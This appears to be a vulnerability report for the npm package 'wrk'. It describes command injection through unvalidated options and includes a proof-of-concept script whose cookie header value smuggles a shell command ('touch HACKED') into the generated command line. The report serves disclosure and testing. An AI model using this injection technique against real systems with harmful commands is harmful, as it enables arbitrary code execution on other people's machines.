# Description

The `wrk` module is vulnerable against `RCE` since a command is crafted using `user inputs` not validated and then executed, leading to `arbitrary command injection`

# POC

1. Create the following PoC file:

```js
// poc.js
var wrk = require('wrk');
wrk({ threads: 1, connections: ['s','aaa'], duration: '10s', printLatency: true, headers: { cookie: 'test \'; touch HACKED; #' }, url: 'http://localhost:3000/' }); //Error !! --> any problem
```
2. Check there aren't files called `HACKED` 
3. Execute the following commands in another terminal:

```bash
npm i wrk # Install affected module
node poc.js #  Run the PoC
```
4. Recheck the files: now `HACKED` has been created
